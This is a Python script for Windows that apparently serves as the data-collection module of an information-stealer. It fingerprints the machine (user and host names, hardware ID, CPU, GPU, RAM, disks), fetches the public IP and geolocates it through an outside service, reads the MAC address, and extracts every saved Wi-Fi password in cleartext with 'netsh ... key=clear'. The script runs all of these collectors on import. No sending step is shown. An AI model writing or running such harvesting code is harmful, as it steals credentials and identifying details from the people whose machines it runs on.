import ctypes
import os
import re
import subprocess
import uuid

import psutil
import requests
import wmi


class SystemInfo():

    def user_data(self):
        def display_name():
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3

            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)

            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)

            return nameBuffer.value

        display_name = display_name()
        hostname = os.getenv('COMPUTERNAME')
        username = os.getenv('USERNAME')

        return f"Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}"

    def system_data(self):
        def get_hwid() -> str:
            hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

            return hwid

        cpu = wmi.WMI().Win32_Processor()[0].Name
        gpu = wmi.WMI().Win32_VideoController()[0].Name
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                    0].TotalVisibleMemorySize) / 1048576, 0)
        hwid = get_hwid()

        return f"CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}"
    
    import os
    import psutil

    def disk_data(self):
        disk = ("{:<9} "*4).format("Mountpoint", "Free", "Total", "Use%") + "\n"
        for part in psutil.disk_partitions(all=False):
            if os.name == 'nt' or os.name == 'posix':
                usage = psutil.disk_usage(part.mountpoint)
                disk += ("{:<9} "*4).format(part.mountpoint, str(
                    usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"

        return f"{disk}"
            
    def network_data(self):
        def geolocation(ip: str) -> str:
            url = f"http://ip-api.com/json/{ip}"
            response = requests.get(url, headers={
                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
            data = response.json()

            return (data["country"], data["regionName"], data["city"], data["zip"], data["as"])

        ip = requests.get("https://api.ipify.org").text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        country, region, city, zip_, as_ = geolocation(ip)

        return f"IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}".format(
                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_)

    def wifi_data(self):
        networks, out = [], ''
        try:
            wifi = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profiles'], shell=True,
                stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
            wifi = [i.split(":")[1][1:-1]
                    for i in wifi if "All User Profile" in i]

            for name in wifi:
                try:
                    results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'], shell=True,
                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1]
                               for b in results if "Key Content" in b]
                except subprocess.CalledProcessError:
                    networks.append((name, ''))
                    continue

                try:
                    networks.append((name, results[0]))
                except IndexError:
                    networks.append((name, ''))

        except subprocess.CalledProcessError:
            pass

        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
        out += f'{"-"*20}|{"-"*29}\n'
        for name, password in networks:
            out += '{:<20}| {:<}\n'.format(name, password)

        return f"{out}"  

x = SystemInfo()
userData = x.user_data()
systemData = x.system_data()
diskData = x.disk_data()
networkData = x.network_data()
wifiData = x.wifi_data()

